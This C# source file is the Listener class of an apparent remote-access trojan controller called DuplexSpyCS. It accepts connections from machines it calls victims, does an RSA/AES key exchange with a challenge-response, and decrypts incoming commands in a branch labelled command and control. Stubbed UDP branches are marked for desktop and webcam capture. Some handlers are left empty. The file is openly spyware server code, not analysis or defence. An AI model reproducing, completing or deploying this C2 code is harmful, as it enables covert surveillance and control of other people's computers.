using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO.Compression;

namespace DuplexSpyCS
{
    public class Listener
    {
        //SOCKET
        public Socket socket;
        public UdpClient udpServer;

        public int port = -1; //-1: Not specified. -> Server is not running.
        public int nUdpPort = -1;

        int MAX_BUFFER_LENGTH = 65536; //BUFFER MAXIMUM LENGTH
        public List<Victim> l_victim = new List<Victim>(); //Victim LIST

        //EVENTS
        public delegate void ReceivedEventHandler(Listener l, Victim v, (int Command, int Param, int DataLength, byte[] MessageData) buffer, int rec);
        public event ReceivedEventHandler Received;
        public delegate void ReceivedDecodedEventHandler(Listener l, Victim v, string[] aMsg);
        public event ReceivedDecodedEventHandler ReceivedDecoded;
        public delegate void DisconenctedEventHandler(Victim v);
        public event DisconenctedEventHandler Disconencted;

        //STATUS
        public int _received_bytes = 0;
        public int ReceivedBytes { get { return _received_bytes; } }
        public int _sent_bytes = 0;
        public int SentBytes { get { return _sent_bytes; } }

        //LOGS
        private SqlConn sql_conn;

        //Ini
        private IniManager ini_manager = C2.ini_manager;

        //CONSTRUCTOR
        public Listener()
        {
            sql_conn = C2.sql_conn;
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        //Crypto
        private string GetChallengeText()
        {
            string text = null;

            try
            {
                bool bRandom = ini_manager.Read("Crypto", "bRandom") == "1";
                if (bRandom)
                {
                    const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    int length = int.Parse(ini_manager.Read("Crypto", "length"));
                    Random rand = new Random();
                    char[] results = new char[length];

                    for (int i = 0; i < length; i++)
                        results[i] = chars[rand.Next(chars.Length)];

                    text = new string(results);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "GetChallengeText()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            if (string.IsNullOrEmpty(text))
            {
                MessageBox.Show("Challenge text is null or empty, the server will use \"HelloWorld\" automatically.", "string.IsNullOrEmpty()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                text = "HelloWorld";
            }

            return text;
        }

        private byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }

        //GZIP - DECOMPRESS
        private byte[] Decompress(byte[] buffer)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream(buffer))
                {
                    using (GZipStream gzip = new GZipStream(ms, CompressionMode.Decompress))
                    {
                        using (MemoryStream result = new MemoryStream())
                        {
                            gzip.CopyTo(result);
                            return result.ToArray();
                        }
                    }
                }
            }
            catch
            {
                return buffer;
            }
        }

        //START LISTEN
        public void Start(int port)
        {
            this.port = port;
            nUdpPort = port;

            //TCP
            socket.SendTimeout = -1; //NEVER TIMEOUT
            socket.ReceiveTimeout = -1; //NEVER TIMEOUT
            socket.Bind(new IPEndPoint(IPAddress.Any, port));

            socket.Listen(10000);
            socket.BeginAccept(new AsyncCallback(AcceptCallBack), socket);
        }

        //STOP LISTEN
        public void Stop()
        {
            socket.Close();
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        /// <summary>
        /// Accept new callback socket.
        /// </summary>
        /// <param name="ar"></param>
        private void AcceptCallBack(IAsyncResult ar)
        {
            Socket handler = (Socket)ar.AsyncState;
            try
            {
                Socket client = handler.EndAccept(ar);
                if (l_victim.Select(x => x.socket.RemoteEndPoint.ToString().Split(':')[0]).ToArray().Contains(client.RemoteEndPoint.ToString().Split(':')[0]))
                {
                    client.Disconnect(true);
                    return;
                }
                Victim v = new Victim(client);
                v.ID = client.RemoteEndPoint.ToString();
                handler.BeginAccept(new AsyncCallback(AcceptCallBack), handler);
                v.socket.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallBack), v);
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message, "AcceptCallback()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                sql_conn.WriteSysErrorLogs("AcceptcCallback()", ex.Message);
            }
        }

        /// <summary>
        /// Process all data from victim.
        /// </summary>
        /// <param name="ar"></param>
        private void ReadCallBack(IAsyncResult ar)
        {
            Victim v = (Victim)ar.AsyncState;
            sql_conn.WriteSystemLogs($"New client is accepted: {v.socket.RemoteEndPoint.ToString()}");
            try
            {
                Socket socket = v.socket;
                DSP dsp = null;
                int receive_len = 0;
                byte[] static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
                byte[] dynamic_receiveBuffer = new byte[] { };
                string[] key_pairs = Crypto.CreateRSAKey();
                v.key_pairs = (key_pairs[0], key_pairs[1]);
                string b64_PublicKey = Crypto.b64E2Str(v.key_pairs.public_key);
                v.Send(1, 0, b64_PublicKey); //PARAM: 1 -> RSA PUBLIC KEY
                sql_conn.WriteKeyExchange(v, "Sent RSA public key");
                do
                {
                    static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
                    receive_len = v.socket.Receive(static_receiveBuffer);
                    C2.recv_bytes += receive_len;
                    dynamic_receiveBuffer = CombineBytes(
                        dynamic_receiveBuffer,
                        0,
                        dynamic_receiveBuffer.Length,
                        static_receiveBuffer,
                        0,
                        receive_len
                    );
                    if (receive_len <= 0)
                        break;
                    else if (dynamic_receiveBuffer.Length < DSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = DSP.GetHeader(dynamic_receiveBuffer);
                        while (dynamic_receiveBuffer.Length - DSP.HEADER_SIZE >= head_info.len)
                        {
                            //dynamic_receiveBuffer = Decompress(dynamic_receiveBuffer);
                            dsp = new DSP(dynamic_receiveBuffer);
                            dynamic_receiveBuffer = dsp.MoreData;
                            head_info = DSP.GetHeader(dynamic_receiveBuffer);
                            if (dsp.Command == 0) //CONNECTION
                            {
                                if (dsp.Param == 0) //DISCONNECT
                                {

                                }
                                else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                {

                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 1) //ENCRYPT AES KEY AND IV -> CHALLENGE AND RESPONSE
                                {
                                    byte[] enc_aesData = dsp.GetMsg().msg;
                                    
                                    string enc_data = Encoding.UTF8.GetString(Crypto.RSADecrypt(enc_aesData, v.key_pairs.private_key));
                                    string[] s = enc_data.Split('|');
                                    
                                    string key = s[0];
                                    string iv = s[1];

                                    v._AES.key = Convert.FromBase64String(key);
                                    v._AES.iv = Convert.FromBase64String(iv);
                                    string challenge = GetChallengeText();
                                    v.challenge_text = challenge;
                                    string cipher_text = Crypto.AESEncrypt(challenge, v._AES.key, v._AES.iv);
                                    byte[] buffer = Encoding.UTF8.GetBytes(cipher_text);
                                    v.Send(1, 2, buffer);

                                    sql_conn.WriteKeyExchange(v, "Sent encrypted challenge");
                                }
                                else if (dsp.Param == 3) //CHALLENGE AND RESPONSE
                                {
                                    byte[] enc_aesData = dsp.GetMsg().msg;
                                    string enc_data = Crypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(enc_aesData)), v._AES.key, v._AES.iv);
                                    string payload = Encoding.UTF8.GetString(Crypto.RSADecrypt(Convert.FromBase64String(enc_data), v.key_pairs.private_key));
                                    if (payload == v.challenge_text)
                                    {
                                        v.encSend(1, 4, "1");
                                        DateTime datetime = DateTime.Now;
                                        v.last_sent = datetime;
                                        v.encSend(2, 1, datetime.ToString("F"));
                                        sql_conn.WriteKeyExchange(v, "OK");
                                    }
                                }
                                else if (dsp.Param == 4) //RESET AES KEY
                                {

                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0)
                                {
                                    var buffer = dsp.GetMsg();

                                    string dec_data = Crypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(buffer.msg)), v._AES.key, v._AES.iv);
                                    string[] cmd = dec_data.Split("|");

                                    //Received(this, v, buffer, 0);
                                    ReceivedDecoded(this, v, cmd);
                                }
                                else if (dsp.Param == 1)
                                {
                                    DateTime datetime = DateTime.Now;
                                    TimeSpan span = datetime - v.last_sent;
                                    v.latency_time = span.Milliseconds;
                                    v.last_sent = datetime;

                                    v.encSend(2, 1, datetime.ToString("F"));
                                }
                            }
                            else if (dsp.Command == 3)
                            {

                            }
                        }
                    }
                } while (receive_len > 0);

            }
            catch (Exception ex) //ERROR -> DISCONNECT
            {
                //MessageBox.Show(ex.Message);
                C2.sql_conn.WriteErrorLogs(v, ex.Message);
                l_victim.Remove(v);
                Disconencted(v);
            }
            finally
            {
                
            }
        }

        private void UdpReceiveCallback(IAsyncResult ar)
        {
            DSP dsp = null;

            UdpClient udpServer = (UdpClient)ar.AsyncState;
            IPEndPoint ep = new IPEndPoint(IPAddress.Any, nUdpPort);
            int recv_len = 0;
            do
            {
                byte[] static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
                byte[] dynamic_receiveBuffer = new byte[] { };

                static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
                static_receiveBuffer = udpServer.Receive(ref ep);

                recv_len = static_receiveBuffer.Length;

                C2.recv_bytes += recv_len;
                dynamic_receiveBuffer = CombineBytes(
                    dynamic_receiveBuffer,
                    0,
                    dynamic_receiveBuffer.Length,
                    static_receiveBuffer,
                    0,
                    recv_len
                );
                
                if (recv_len <= 0)
                    break;
                else if (recv_len <= DSP.HEADER_SIZE)
                    continue;
                else
                {
                    var head_info = DSP.GetHeader(dynamic_receiveBuffer);
                    while (dynamic_receiveBuffer.Length - DSP.HEADER_SIZE >= head_info.len)
                    {
                        dsp = new DSP(dynamic_receiveBuffer);
                        dynamic_receiveBuffer = dsp.MoreData;
                        head_info = DSP.GetHeader(dynamic_receiveBuffer);

                        if (dsp.Command == 2)
                        {
                            if (dsp.Param == 0) //Desktop
                            {

                            }
                            else if (dsp.Param == 1) //Webcam
                            {

                            }
                        }
                    }
                }

            } while (recv_len > 0);
        }
    }
}